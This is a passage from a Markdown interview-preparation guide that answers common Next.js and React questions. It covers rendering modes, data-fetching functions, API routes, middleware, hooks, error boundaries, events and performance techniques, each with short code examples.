   **App Router structure:**
   ```
   app/
   ├── page.js           // /
   ├── layout.js         // Root layout
   ├── loading.js
   ├── error.js
   ├── about/page.js     // /about
   └── posts/[id]/page.js // /posts/:id
   ```

   The App Router is recommended for new Next.js applications.

1. Explain the rendering methods in Next.js (CSR, SSR, SSG, ISR).

   | Method | When HTML is generated | Data freshness | Use case |
   | --- | --- | --- | --- |
   | **CSR** (Client-Side Rendering) | In the browser at runtime | Always fresh | Dashboards, authenticated pages |
   | **SSR** (Server-Side Rendering) | On every request | Always fresh | Real-time personalized pages |
   | **SSG** (Static Site Generation) | At build time | Stale until next build | Blogs, marketing pages |
   | **ISR** (Incremental Static Regeneration) | At build time + background revalidation | Fresh after revalidation window | E-commerce, large content sites |

   ```js
   // SSG — data fetched once at build time
   export async function getStaticProps() {
     const data = await fetchPosts();
     return { props: { data } };
   }

   // SSR — data fetched on every request
   export async function getServerSideProps(context) {
     const data = await fetchUser(context.params.id);
     return { props: { data } };
   }

   // ISR — revalidate every 60 seconds
   export async function getStaticProps() {
     const data = await fetchProducts();
     return { props: { data }, revalidate: 60 };
   }
   ```

1. What are `getStaticProps`, `getServerSideProps`, and `getStaticPaths`?
   - These are **Page Router** data-fetching functions (not available in the App Router — use `async/await` in Server Components instead).

   **`getStaticProps`** — fetches data at **build time**, generates static HTML:
   ```js
   export async function getStaticProps() {
     const posts = await fetch("https://api.example.com/posts").then(r => r.json());
     return { props: { posts }, revalidate: 60 }; // ISR: refresh every 60s
   }
   ```

   **`getServerSideProps`** — fetches data on **every request**, renders on the server:
   ```js
   export async function getServerSideProps(context) {
     const { params, req, res } = context;
     const user = await fetchUser(params.id);
     return { props: { user } };
   }
   ```

   **`getStaticPaths`** — used alongside `getStaticProps` for dynamic routes; tells Next.js which paths to pre-render:
   ```js
   export async function getStaticPaths() {
     const posts = await fetch("https://api.example.com/posts").then(r => r.json());
     const paths = posts.map(post => ({ params: { id: String(post.id) } }));
     return { paths, fallback: "blocking" }; // or false / true
   }
   ```

   | | `getStaticProps` | `getServerSideProps` | `getStaticPaths` |
   | --- | --- | --- | --- |
   | Runs at | Build time | Every request | Build time |
   | Output | Static HTML | Server-rendered HTML | Path list for static generation |
   | Use with | Static pages | Dynamic, personalized pages | Dynamic routes + `getStaticProps` |

1. What are API routes in Next.js?
   - **API routes** are serverless functions built into Next.js that let you create backend endpoints within the same application — no separate backend server needed.

   **Page Router** — files inside `pages/api/`:
   ```js
   // pages/api/hello.js → accessible at /api/hello
   export default function handler(req, res) {
     if (req.method === "GET") {
       res.status(200).json({ message: "Hello World" });
     } else {
       res.status(405).end(); // Method Not Allowed
     }
   }
   ```

   **App Router** — `route.ts` files inside `app/api/`:
   ```ts
   // app/api/hello/route.ts → accessible at /api/hello
   export async function GET() {
     return Response.json({ message: "Hello World" });
   }

   export async function POST(request: Request) {
     const body = await request.json();
     return Response.json({ received: body });
   }
   ```

   - API routes run server-side — safe for database queries, secret keys, and auth logic.
   - Each route is deployed as a standalone **serverless function** by default.

1. What is a Serverless Function in Next.js?
   - A **serverless function** is a lightweight, stateless function deployed in the cloud that runs only when requested — no always-on server needed. It scales automatically.
   - In Next.js, every API route and Server Action is deployed as a serverless function.

   ```ts
   // app/api/hello/route.ts — deployed as a standalone serverless function
   export async function GET() {
     return Response.json({ status: "ok" });
   }

   // Run at Edge (ultra-low latency, globally distributed)
   export const runtime = "edge";
   ```

   | Runtime | Where it runs | Cold start | Use case |
   | --- | --- | --- | --- |
   | Node.js (default) | Regional server | ~100–300ms | Full Node.js APIs, DB access |
   | Edge | CDN edge nodes | <50ms | Auth checks, redirects, A/B tests |

1. How do you implement protected routes in Next.js?
   - Use **middleware** (`middleware.ts` at the project root) to intercept requests and redirect unauthenticated users before the page loads.

   ```ts
   // middleware.ts
   import { NextResponse } from "next/server";
   import type { NextRequest } from "next/server";

   export function middleware(request: NextRequest) {
     const token = request.cookies.get("auth-token")?.value;

     if (!token) {
       return NextResponse.redirect(new URL("/login", request.url));
     }

     return NextResponse.next(); // allow request to continue
   }

   // Apply middleware only to these routes
   export const config = {
     matcher: ["/dashboard/:path*", "/profile/:path*"],
   };
   ```

   - Middleware runs at the **Edge** — before the request reaches the page/API route.
   - For more complex auth, combine with a session library like `next-auth` or `iron-session`.

1. How does `font-display: swap` help with font optimization (LCP and CLS)?
   - **`font-display: swap`** tells the browser to show fallback text immediately using a system font, then swap in the custom font once it loads.

   | Web Vital | Without swap | With swap |
   | --- | --- | --- |
   | **LCP** (Largest Contentful Paint) | Text invisible until font loads → slower perceived load | Text appears immediately → faster LCP |
   | **CLS** (Cumulative Layout Shift) | Font loads late → content jumps/shifts | Layout stabilizes faster → lower CLS |

   ```css
   @font-face {
     font-family: "MyFont";
     src: url("/fonts/myfont.woff2") format("woff2");
     font-display: swap; /* show fallback immediately, swap when ready */
   }
   ```

   **Next.js** handles this automatically via the `next/font` module:
   ```js
   import { Inter } from "next/font/google";
   const inter = Inter({ subsets: ["latin"], display: "swap" });
   ```
   - `next/font` also self-hosts fonts, eliminating the extra DNS lookup to Google Fonts.

1. How do you run a production build locally in Next.js?
   - Build the app for production and then start it:
   ```bash
   # Build production bundle
   next build

   # Start the production server locally
   next start
   ```

   - To use `.env.production` variables during the local production run:
   ```bash
   NODE_ENV=production next build && next start
   ```

   - `next build` runs at `NODE_ENV=production` by default — `.env.production` is loaded automatically.
   - `next start` serves the pre-built `.next` folder — you must run `next build` first.

---

### React 19

1. New Features in React 19
    - **Actions** — Server + client mutations
    - **`use()` Hook**
    - **`useOptimistic` Hook**

---

### Advanced Concepts

1. What is a React data leak?
   - A **data leak** occurs when data stays in memory longer than needed or becomes visible to the wrong user or component.
   - Common causes in React:

   | Cause | Example |
   | --- | --- |
   | **State update after unmount** | async fetch resolves after the component is removed — `setState` on an unmounted component |
   | **One user seeing another's data** | Server-cached state shared across requests (SSR without request-scoped state) |
   | **Sensitive data sent to browser** | Passing secret keys or private DB data into client component props |
   | **Uncleaned subscriptions/timers** | `setInterval` or WebSocket not removed → keeps component alive in memory |

   **Fix: cleanup async operations in `useEffect`:**
   ```jsx
   useEffect(() => {
     let cancelled = false;
     fetchUser(userId).then(data => {
       if (!cancelled) setUser(data); // guard against unmounted component
     });
     return () => { cancelled = true; }; // cleanup
   }, [userId]);
   ```

   **Fix: use `AbortController` for fetch:**
   ```jsx
   useEffect(() => {
     const controller = new AbortController();
     fetch(`/api/user/${userId}`, { signal: controller.signal })
       .then(r => r.json()).then(setUser)
       .catch(err => { if (err.name !== "AbortError") setError(err); });
     return () => controller.abort();
   }, [userId]);
   ```

1. What are Error Boundaries in React?
    - Error Boundaries catch JavaScript errors anywhere in their child component tree, log them, and display a fallback UI instead of crashing.
    - ⚠️ **Error Boundaries can ONLY be class components** — there is no function component equivalent for `componentDidCatch`. You cannot build an error boundary with hooks.

    ```jsx
    class ErrorBoundary extends React.Component {
      constructor(props) {
        super(props);
        this.state = { hasError: false };
      }

      static getDerivedStateFromError(error) {
        return { hasError: true }; // triggers fallback render
      }

      componentDidCatch(error, info) {
        console.error("Caught error:", error, info);
      }

      render() {
        if (this.state.hasError) return <h2>Something went wrong.</h2>;
        return this.props.children;
      }
    }

    // Usage
    <ErrorBoundary>
      <MyComponent />
    </ErrorBoundary>
    ```

    - Error boundaries do **not** catch: errors in event handlers, async code (`setTimeout`), SSR errors, or errors thrown inside the boundary itself.

1. What are the types of components in React?

    | Type | Description |
    | --- | --- |
    | **Functional Component** | JS function returning JSX — modern standard, uses hooks |
    | **Class Component** | ES6 class extending `React.Component` — uses lifecycle methods |
    | **Pure Component** | Class with built-in shallow prop/state comparison (`PureComponent`) |
    | **Higher-Order Component (HOC)** | Function that takes a component and returns an enhanced component |
    | **Controlled Component** | Form value driven by React state |
    | **Uncontrolled Component** | Form value managed by DOM via `useRef` |
    | **Server Component** | Renders on the server, no interactivity (React 18+ / Next.js) |

    ```jsx
    // Functional
    const Hello = ({ name }) => <h1>Hello, {name}</h1>;

    // Class
    class Hello extends React.Component {
      render() { return <h1>Hello, {this.props.name}</h1>; }
    }

    // HOC
    const withLogger = (Component) => (props) => {
      console.log("Rendering", Component.name);
      return <Component {...props} />;
    };
    ```

1. What is React Fiber?
    - React Fiber is the **reimplementation of React's reconciliation engine** (React 16+). It breaks rendering into small units of work that can be **paused, resumed, or discarded** based on priority.

    | Before Fiber (Stack Reconciler) | After Fiber |
    | --- | --- |
    | Synchronous — could not be interrupted | Asynchronous — can pause and resume |
    | One large render call | Split into incremental units of work |
    | Blocked the main thread for large trees | Yields to browser between units |

    - Powers **Concurrent Mode**, **Suspense**, **Error Boundaries**, and **Time Slicing**.
    - High-priority updates (user input) can interrupt low-priority renders (data fetching).

1. What are React optimization techniques?
    - **`React.memo`** — skip re-render of a component when its props haven't changed.
    - **`useMemo`** — memoize expensive computed values.
    - **`useCallback`** — memoize function references passed as props.
    - **Code splitting** — `React.lazy` + `Suspense` to load components on demand.
    - **Virtualization** — render only visible rows in long lists (`react-window`).
    - **Avoid anonymous functions in JSX** — they create new references every render.
    - **Stable `key` props** — use unique IDs, not array indexes.
    - **Debounce/throttle** — limit expensive event handler execution rate.
    - **Production build** — `npm run build` enables minification and dead-code removal.

1. What is debouncing and throttling?
    - **Debouncing:** Delays execution until after a pause since the last call. Only the final call fires.
    - **Throttling:** Limits execution to **at most once** per time interval regardless of call frequency.

    | | Debounce | Throttle |
    | --- | --- | --- |
    | Fires | After pause since last call | At most once per interval |
    | Rapid calls | Only last call executes | First call fires; rest skipped until interval passes |
    | Use case | Search input, form validation | Scroll, resize, button spam |

    ```jsx
    // Debounce — waits for user to stop typing
    const debounce = (fn, delay) => {
      let timer;
      return (...args) => {
        clearTimeout(timer);
        timer = setTimeout(() => fn(...args), delay);
      };
    };

    // Throttle — fires at most once per second
    const throttle = (fn, limit) => {
      let lastCall = 0;
      return (...args) => {
        const now = Date.now();
        if (now - lastCall >= limit) { lastCall = now; fn(...args); }
      };
    };
    ```

1. Throttle a button click using only arrow functions (no `useRef`)
    - Use a **module-level variable** outside the component as the timestamp store — it persists across re-renders without triggering them, and without needing `useRef`.

    ```jsx
    let lastCallTime = 0; // module-level — persists across renders

    const ThrottledButton = () => {
      const handleClick = () => {
        const now = Date.now();
        if (now - lastCallTime >= 1000) {
          lastCallTime = now;
          console.log("Action fired at", new Date().toLocaleTimeString());
        }
      };

      return <button onClick={handleClick}>Click Me (throttled 1s)</button>;
    };
    ```

1. Custom Hook — `useToggle`
    - A custom hook is a JS function starting with `use` that calls other hooks internally. It extracts and reuses stateful logic across components without changing the component tree.

    ```jsx
    import { useState } from "react";

    // Custom hook
    const useToggle = (initial = false) => {
      const [value, setValue] = useState(initial);
      const toggle = () => setValue(prev => !prev);
      return [value, toggle];
    };

    // Usage
    const Modal = () => {
      const [isOpen, toggleOpen] = useToggle(false);
      return (
        <div>
          <button onClick={toggleOpen}>{isOpen ? "Close" : "Open"} Modal</button>
          {isOpen && <p>Modal is visible!</p>}
        </div>
      );
    };
    ```

    - The hook encapsulates the `useState` + toggle logic — any component can reuse it with one line.

1. Does React create a new Virtual DOM or update the existing one on re-render?
    - React creates a **brand-new Virtual DOM tree** on every re-render.
    - It then **diffs** the new tree against the previous snapshot (**reconciliation**).
    - Only the actual differences are flushed to the **real DOM** — the old Virtual DOM is discarded.

    ```
    State or prop changes
           ↓
    New Virtual DOM tree built (cheap — plain JS objects)
           ↓
    Diff: new tree vs previous snapshot (reconciliation / React Fiber)
           ↓
    Minimal patch computed
           ↓
    Real DOM updated (only the changed nodes)
    ```

    - Building a new Virtual DOM is fast — it's just creating JS objects in memory.
    - The real DOM is only touched for the actual differences, which is the expensive part that React minimizes.

1. What is lifting state up in React?
    - When sibling components need to share state, **move the state to their closest common parent** and pass it down as props with a callback to update it.

    ```jsx
    const Parent = () => {
      const [text, setText] = useState("");
      return (
        <>
          <Input onChange={setText} />
          <Display value={text} />
        </>
      );
    };

    const Input = ({ onChange }) => (
      <input placeholder="Type..." onChange={e => onChange(e.target.value)} />
    );

    const Display = ({ value }) => <p>You typed: <strong>{value}</strong></p>;
    ```

    - `Input` fires the parent's setter via the `onChange` prop — it owns no state.
    - `Display` reads the value from the parent — both siblings stay in sync through shared parent state.

1. What are `Suspense` and `React.lazy`? How do they enable code splitting?
    - **`React.lazy()`** — dynamically imports a component, splitting it into a separate bundle chunk that loads only when first rendered.
    - **`<Suspense>`** — wraps lazy components and shows a **fallback UI** while the chunk is being fetched.

    ```jsx
    import React, { Suspense, lazy } from "react";

    const Dashboard = lazy(() => import("./Dashboard")); // separate chunk

    const App = () => (
      <Suspense fallback={<p>Loading...</p>}>
        <Dashboard />
      </Suspense>
    );
    ```

    ```jsx
    // Route-based code splitting
    const Home    = lazy(() => import("./pages/Home"));
    const Profile = lazy(() => import("./pages/Profile"));

    <Suspense fallback={<Spinner />}>
      <Routes>
        <Route path="/"        element={<Home />} />
        <Route path="/profile" element={<Profile />} />
      </Routes>
    </Suspense>
    ```

    - `React.lazy` only works with **default exports**.
    - `<Suspense>` boundaries can be nested — each shows its own fallback independently.
    - Result: smaller initial bundle — chunks download on demand as users navigate.

1. `React.memo` vs `useMemo`

    | | `React.memo` | `useMemo` |
    | --- | --- | --- |
    | Memoizes | Whole component (skips re-render) | A computed value |
    | Where used | Wraps component definition | Inside component body |
    | Compares | Previous vs new **props** | Dependency array |
    | Returns | Memoized component | Memoized value |

    ```jsx
    // React.memo — child skips re-render if props unchanged
    const Child = React.memo(({ count }) => {
      console.log("Child rendered");
      return <p>Count: {count}</p>;
    });

    // useMemo — skip expensive computation if deps unchanged
    const Parent = () => {
      const [num, setNum] = useState(10);

      const doubled = useMemo(() => {
        console.log("Computing...");
        return num * 2;
      }, [num]);

      return <p>Doubled: {doubled}</p>;
    };
    ```

    - Use `React.memo` to prevent a child component from re-rendering when its props are the same.
    - Use `useMemo` to avoid recalculating an expensive value on every render.

1. What is the difference between `useEffect` and `useLayoutEffect`?
    - Both run after React updates the DOM — the difference is **when** they fire relative to the browser paint.

    | | `useEffect` | `useLayoutEffect` |
    | --- | --- | --- |
    | Runs | After browser paints (async) | After DOM update, before browser paints (sync) |
    | Blocks paint? | ❌ No | ✅ Yes |
    | Use case | Fetch data, subscriptions, timers | Read/write DOM layout (avoid flicker) |
    | Performance | Better for most cases | Can delay visual update if overused |

    **What does "browser paint" mean?**
    After React updates the DOM, the browser must convert those DOM changes into actual pixels on screen. It runs through: **Style → Layout (Reflow) → Paint → Composite**. Only after this step do users see the update. `useEffect` fires after all of this; `useLayoutEffect` fires before the paint step starts.

    ```jsx
    useLayoutEffect(() => {
      // Runs before paint — safe to read/mutate DOM dimensions here
      const width = ref.current.getBoundingClientRect().width;
      if (width > 300) ref.current.style.color = "red"; // applied before user sees it
    }, []);

    useEffect(() => {
      // Runs after paint — ideal for side effects that don't affect layout
      fetch("/api/data").then(res => res.json()).then(setData);
    }, []);
    ```

    - Prefer `useEffect` by default. Only reach for `useLayoutEffect` when you see a visible flicker caused by DOM measurements.

1. What are React lifecycle methods? (Quick Reference)
    - Every React component goes through **Mounting → Updating → Unmounting**.

    | Phase | Class Method | Functional Equivalent |
    | --- | --- | --- |
    | Before render | `constructor()` | `useState()` initial value |
    | Render | `render()` | Function body returns JSX |
    | After mount | `componentDidMount()` | `useEffect(() => {}, [])` |
    | After update | `componentDidUpdate()` | `useEffect(() => {}, [deps])` |
    | Before unmount | `componentWillUnmount()` | Cleanup `return () => {}` in `useEffect` |
    | Error catch | `componentDidCatch()` | No hooks equivalent — class only |

    ```jsx
    // All lifecycle phases in a functional component
    const MyComponent = () => {
      const [data, setData] = useState(null); // constructor equivalent

      useEffect(() => {
        fetch("/api").then(r => r.json()).then(setData); // componentDidMount

        return () => { /* cleanup */ };                  // componentWillUnmount
      }, []);

      useEffect(() => {
        console.log("data changed");                     // componentDidUpdate
      }, [data]);

      return <div>{data}</div>;                          // render
    };
    ```

1. What are design patterns in React?
    - Design patterns in React are **proven, reusable solutions to common structural and logic problems** in component architecture.

    | Pattern | Purpose | Example |
    | --- | --- | --- |
    | **Container / Presentational** | Separate logic from UI | `UserContainer` fetches data, `UserCard` renders it |
    | **Higher-Order Component (HOC)** | Enhance a component with extra behavior | `withAuth(Component)`, `withLogger(Component)` |
    | **Render Props** | Share logic via a function prop | `<Mouse render={(pos) => <Dot x={pos.x} />} />` |
    | **Custom Hook** | Extract and reuse stateful logic | `useFormValidation`, `useFetchData` |
    | **Compound Component** | Components share implicit state | `<Select>` + `<Select.Option>` |
    | **Provider / Context** | Share state without prop drilling | `ThemeProvider`, `AuthContext` |

    ```jsx
    // HOC pattern
    const withLogger = (Component) => (props) => {
      console.log(`Rendering: ${Component.name}`);
      return <Component {...props} />;
    };
    const LoggedButton = withLogger(Button);

    // Compound component pattern
    const Tabs = ({ children }) => { /* manages active state */ };
    Tabs.Tab = ({ label }) => { /* individual tab */ };

    <Tabs>
      <Tabs.Tab label="Home" />
      <Tabs.Tab label="Profile" />
    </Tabs>
    ```

1. What are design patterns? (General Definition)
    - Design patterns are **reusable, named solutions to recurring problems** in software design. They are not finished code — they are templates that describe how to solve a class of problems.
    - Coined by the "Gang of Four" (GoF) in *Design Patterns: Elements of Reusable Object-Oriented Software* (1994).

    | Category | Description | Examples |
    | --- | --- | --- |
    | **Creational** | How objects are created | Singleton, Factory, Builder |
    | **Structural** | How objects are composed | Adapter, Decorator, Proxy, HOC |
    | **Behavioral** | How objects communicate | Observer, Strategy, Command |

    - **Why use them?** Common vocabulary between developers, proven solutions, improved maintainability.
    - In React: HOC = Decorator, Context = Observer, Render Props = Strategy.

1. What is the difference between Babel and Webpack?

    | | Babel | Webpack |
    | --- | --- | --- |
    | Role | **Transpiler** | **Bundler** |
    | What it does | Converts modern JS/JSX → browser-compatible JS | Bundles many files into optimized output |
    | Transforms | JSX, ES2022+, TypeScript syntax | Resolves imports, handles assets (CSS, images) |
    | Output | Same number of files (transformed) | Fewer, optimized bundle files |
    | Key features | Plugins, presets (`@babel/preset-react`) | Loaders, code splitting, tree shaking, HMR |

    ```
    Source files (.jsx, .ts, ES2022)
           ↓
         Babel — transforms syntax (JSX → JS, ES2022 → ES5)
           ↓
        Webpack — resolves imports, bundles, optimizes
           ↓
      dist/bundle.js (production-ready)
    ```

    - Modern tools like **Vite** use **esbuild** (for dev) + **Rollup** (for prod) and handle both roles, replacing the Babel + Webpack combo for many projects.

1. What are the rules for creating custom hooks in React?
    - **1. Name must start with `use`** — React uses this convention to identify hooks and enforce the rules of hooks linting.
    - **2. Only call hooks at the top level** — never inside loops, conditions, or nested functions.
    - **3. Only call hooks from function components or other custom hooks** — not from regular JS functions or class components.
    - **4. One concern per hook** — keep hooks focused; extract multiple hooks if logic grows.
    - **5. Return only what the consumer needs** — expose state values and setters/actions cleanly.

    ```jsx
    // ✅ Valid custom hook
    const useFetch = (url) => {
      const [data, setData] = useState(null);
      const [loading, setLoading] = useState(true);

      useEffect(() => {
        fetch(url)
          .then(r => r.json())
          .then(d => { setData(d); setLoading(false); });
      }, [url]);

      return { data, loading };
    };

    // ❌ Invalid — hook called inside a condition
    const useBad = (flag) => {
      if (flag) {
        const [x, setX] = useState(0); // breaks rules of hooks
      }
    };
    ```

1. How does event propagation work in React?
    - React uses a **synthetic event system** — all events are delegated to the React root, not attached directly to DOM elements.
    - Events still propagate through the same three phases: **Capture → Target → Bubble**.

    ```jsx
    // Bubbling (default)
    const Parent = () => (
      <div onClick={() => console.log("Parent")}>
        <button onClick={() => console.log("Button")}>Click</button>
      </div>
    );
    // Output: "Button" then "Parent" (bubble up)

    // Stop propagation
    <button onClick={(e) => { e.stopPropagation(); console.log("Only Button"); }}>
      Click
    </button>

    // Capture phase — use onClickCapture
    <div onClickCapture={() => console.log("Capture: Parent first")}>
      <button onClick={() => console.log("Bubble: Button")}>Click</button>
    </div>
    // Output: "Capture: Parent first" → "Bubble: Button"
    ```

    - `e.stopPropagation()` — stops event from bubbling further up.
    - `e.preventDefault()` — prevents default browser behavior (form submit, link navigate).
    - `e.nativeEvent` — access the raw browser event if needed.

1. How to do event delegation in React (optimized way)?
    - React already applies event delegation internally at the root — individual element listeners bubble up to one root handler.
    - For dynamic lists, use `data-*` attributes + `closest()` to identify which item was clicked without attaching per-item handlers.

    ```jsx
    const List = ({ items }) => {
      const handleClick = (e) => {
        const item = e.target.closest("[data-id]");
        if (!item) return; // clicked outside any list item
        console.log("Clicked ID:", item.dataset.id);
        console.log("Clicked action:", item.dataset.action);
      };

      return (
        <ul onClick={handleClick}>
          {items.map(({ id, name }) => (
            <li key={id} data-id={id} data-action="select">
              {name}
            </li>
          ))}
        </ul>
      );
    };
    ```

    - `closest("[data-id]")` walks up the DOM from the clicked element — safe even if the user clicks a nested `<span>` inside `<li>`.
    - One handler for the entire list — O(1) listeners regardless of list size.

1. What are Synthetic Events in React?
    - A **SyntheticEvent** is React's cross-browser wrapper around the browser's native event. It normalizes event properties and behavior so they work consistently across all browsers.
    - Same API as native events: `preventDefault()`, `stopPropagation()`, `target`, `currentTarget`, etc.
    - In React 17+, events are **no longer pooled** (prior to React 17, event objects were reused from a pool and nullified after the handler — accessing them async would give `null`).

    ```jsx
    const handleClick = (e) => {
      console.log(e.type);           // "click"
      console.log(e.target);         // actual DOM element
      console.log(e.currentTarget);  // element with the handler
      e.preventDefault();            // normalized, works everywhere
      e.stopPropagation();           // normalized, works everywhere

      // React 17+ — event not pooled, safe to access async
      setTimeout(() => console.log(e.type), 1000); // "click" — still accessible
    };

    // Access native event if needed
    const handleNative = (e) => {
      console.log(e.nativeEvent); // raw browser Event object
    };
    ```

    | Native Event | Synthetic Event |
    | --- | --- |
    | Browser-specific inconsistencies | Normalized across all browsers |
    | Attached directly to DOM elements | Delegated to React root |
    | `event.which`, `keyCode` (legacy) | `event.key` (standardized) |
    | Manual cleanup needed | Handled by React automatically |

1. How to track scroll position in React?
    - Three common approaches depending on whether you need global or element-level scroll tracking.

    ```jsx
    // 1. Global scroll — window scroll position
    const ScrollTracker = () => {
      const [scrollY, setScrollY] = useState(0);

      useEffect(() => {
        const handleScroll = () => setScrollY(window.scrollY);
        window.addEventListener("scroll", handleScroll, { passive: true });
        return () => window.removeEventListener("scroll", handleScroll);
      }, []);

      return <p>Scrolled: {scrollY}px from top</p>;
    };
    ```

    ```jsx
    // 2. Element scroll — scrollable container
    const Box = () => {
      const [scrollTop, setScrollTop] = useState(0);

      return (
        <div
          style={{ height: 200, overflow: "auto" }}
          onScroll={(e) => setScrollTop(e.currentTarget.scrollTop)}
        >
          <p style={{ position: "sticky", top: 0 }}>Top: {scrollTop}px</p>
          <div style={{ height: 1000 }}>Tall content...</div>
        </div>
      );
    };
    ```

    ```jsx
    // 3. Custom hook — reusable across components
    const useScrollPosition = () => {
      const [scrollY, setScrollY] = useState(0);

      useEffect(() => {
        const onScroll = () => setScrollY(window.scrollY);
        window.addEventListener("scroll", onScroll, { passive: true });
        return () => window.removeEventListener("scroll", onScroll);
      }, []);

      return scrollY;
    };

    // Usage — sticky header after 50px scroll
    const Header = () => {
      const scrollY = useScrollPosition();
      return (
        <header style={{ position: scrollY > 50 ? "fixed" : "relative" }}>
          Nav
        </header>
      );
    };
    ```

    - Always use `{ passive: true }` in `addEventListener` for scroll events — it tells the browser you won't call `preventDefault()`, enabling performance optimizations.
    - Always clean up the listener in the `useEffect` return to avoid memory leaks.

---

### Best Practices & Patterns

1. Is this a correct HOC syntax? How does HOC work?
    - Yes, the syntax is valid. There are two ways to write HOCs — the user's inline prop style, and the classic function-wrapping style.

    ```jsx
    // ✅ Inline prop style (your version) — passes component as a prop
    const HOC = ({ Comp, openTonetwork }) => {
      return openTonetwork ? <div><Comp /></div> : <Comp />;
    };

    const Profile = () => <div>Profile</div>;

    const Parent = () => (
      <>
        <div>test</div>
        <HOC Comp={Profile} openTonetwork={true} />
      </>
    );
    ```

    ```jsx
    // ✅ Classic HOC style — function returns a new component (more reusable)
    const withNetwork = (Component) => {
      return function WrappedComponent(props) {
        const [isOnline, setIsOnline] = useState(navigator.onLine);
        return isOnline ? <Component {...props} /> : <p>You are offline</p>;
      };
    };

    const ProfileWithNetwork = withNetwork(Profile);

    // Usage — looks like a regular component
    <ProfileWithNetwork name="Mohamed" />
    ```

    | Style | When to use |
    | --- | --- |
    | Inline prop (`Comp={Profile}`) | Simple wrappers, quick conditional rendering |
    | Classic `withX(Component)` | Reusable behavior across many components (auth, logging, theming) |

    - Classic HOC convention: name the wrapping function `withSomething` and spread `{...props}` to avoid breaking the wrapped component's own props.

1. Single Responsibility Principle (SRP) in React
    - **One component should do ONE job.** If a component is fetching data, managing form state, and rendering a list all at once — break it apart.

    ```jsx
    // ❌ Bad — one component doing everything
    const UserPage = () => {
      const [users, setUsers] = useState([]);
      useEffect(() => {
        fetch("/api/users").then(r => r.json()).then(setUsers);
      }, []);
      const handleDelete = (id) => { /* ... */ };
      return (
        <ul>
          {users.map(u => (
            <li key={u.id}>{u.name}
              <button onClick={() => handleDelete(u.id)}>Delete</button>
            </li>
          ))}
        </ul>
      );
    };
    ```

    ```jsx
    // ✅ Good — each unit has one job
    const useUsers = () => {               // hook: data fetching only
      const [users, setUsers] = useState([]);
      useEffect(() => {
        fetch("/api/users").then(r => r.json()).then(setUsers);
      }, []);
      return users;
    };

    const UserItem = ({ user, onDelete }) => ( // component: render one item
      <li>{user.name} <button onClick={() => onDelete(user.id)}>Delete</button></li>
    );

    const UserList = ({ users, onDelete }) => ( // component: render list
      <ul>{users.map(u => <UserItem key={u.id} user={u} onDelete={onDelete} />)}</ul>
    );

    const UserPage = () => {               // component: orchestrate only
      const users = useUsers();
      const handleDelete = (id) => { /* ... */ };
      return <UserList users={users} onDelete={handleDelete} />;
    };
    ```

    - **Rule of thumb:** If you need to say "and" to describe what a component does, it's doing too much.

1. State mutation rules — never mutate directly
    - React uses **reference equality** to detect changes. If you mutate the existing object/array, the reference stays the same — React won't know the state changed and **won't re-render**.

    ```jsx
    // ❌ Wrong — mutating the existing array (same reference)
    const addItem = () => {
      items.push("new item"); // mutates original array
      setItems(items);        // same reference → React skips re-render
    };

    // ✅ Correct — create a new array (new reference)
    const addItem = () => setItems([...items, "new item"]);
    const removeItem = (id) => setItems(items.filter(item => item.id !== id));

    // ❌ Wrong — mutating object state
    const updateUser = () => {
      user.name = "John"; // mutates original object
      setUser(user);      // same reference → no re-render
    };

    // ✅ Correct — spread to create a new object
    const updateUser = () => setUser({ ...user, name: "John" });
    ```

    **When to use state:**

    | Use state ✅ | Don't use state ❌ |
    | --- | --- |
    | Local data that changes and affects UI | Data that never changes (use `const`) |
    | Form input values | Data derived from other state (compute in render) |
    | Toggle flags (isOpen, isLoading) | Data needed by many distant components (use Context) |

1. Hooks rules — top level, dependencies, and cleanup
    - **Rule 1 — Top level only:** Never call hooks inside `if`, `for`, or nested functions. React relies on the order hooks are called — changing order breaks things.

    ```jsx
    // ❌ Wrong — hook inside a condition
    const MyComp = ({ flag }) => {
      if (flag) {
        const [x, setX] = useState(0); // breaks rules — order not guaranteed
      }
    };

    // ✅ Correct — always at top level, condition inside
    const MyComp = ({ flag }) => {
      const [x, setX] = useState(0);
      if (!flag) return null;
      return <div>{x}</div>;
    };
    ```

    - **Rule 2 — Declare all dependencies:** Everything used inside `useEffect` that comes from the component scope must be in the deps array, or you risk stale closures.

    ```jsx
    // ❌ Wrong — missing dependency (stale closure bug)
    useEffect(() => {
      console.log(userId); // reads stale userId
    }, []); // userId not listed

    // ✅ Correct
    useEffect(() => {
      console.log(userId);
    }, [userId]); // re-runs whenever userId changes
    ```

    - **Rule 3 — Extract reusable logic:** If two components share the same `useEffect` + `useState` pattern, extract it into a custom hook.

1. When does the `useEffect` cleanup function run?
    - The function you `return` from `useEffect` runs in **two situations**:
      1. **Before the component unmounts** (removed from DOM).
      1. **Before the effect runs again** — when a dependency changes, the previous cleanup runs first, then the new effect runs.

    ```jsx
    useEffect(() => {
      const handleResize = () => console.log("resized");
      window.addEventListener("resize", handleResize);

      return () => {
        window.removeEventListener("resize", handleResize); // cleanup
      };
    }, []); // [] = no deps → cleanup only on unmount
    ```

    ```jsx
    // With a dependency — cleanup runs on every userId change
    useEffect(() => {
      const sub = subscribeToUser(userId);
      console.log("Subscribed to", userId);

      return () => {
        sub.unsubscribe();
        console.log("Unsubscribed from", userId); // runs before re-subscribing
      };
    }, [userId]);

    // Timeline when userId changes from 1 → 2:
    // 1. cleanup (unsubscribe from 1) ← return fn runs
    // 2. effect (subscribe to 2) ← effect runs again
    ```

    **When to always write cleanup:**

    | Side effect | Cleanup needed |
    | --- | --- |
    | `addEventListener` | `removeEventListener` |
    | `setInterval` / `setTimeout` | `clearInterval` / `clearTimeout` |
    | WebSocket / subscription | `.close()` / `.unsubscribe()` |
    | Fetch (to cancel in-flight request) | `AbortController.abort()` |

1. Performance optimizations — `React.memo`, `useCallback`, `useMemo`, debounce, lazy
    - **`React.memo`** — wraps a component to skip re-render if props haven't changed (shallow compare).

    ```jsx
    // Without memo — re-renders every time Parent re-renders, even if count unchanged
    const Child = ({ count }) => { console.log("render"); return <p>{count}</p>; };

    // With memo — skips re-render if count prop is the same
    const Child = React.memo(({ count }) => { console.log("render"); return <p>{count}</p>; });
    ```

    - **`useCallback`** — memoizes a function so its reference doesn't change on every render. Pair with `React.memo` on child components.

    ```jsx
    // ❌ Without useCallback — new function reference every render → Child always re-renders
    const handleClick = () => doSomething(id);

    // ✅ With useCallback — stable reference, Child only re-renders when id changes
    const handleClick = useCallback(() => doSomething(id), [id]);
    ```

    - **`useMemo`** — memoizes an expensive computed value, only recalculates when deps change.

    ```jsx
    // Expensive filter only re-runs when search or products changes
    const filtered = useMemo(
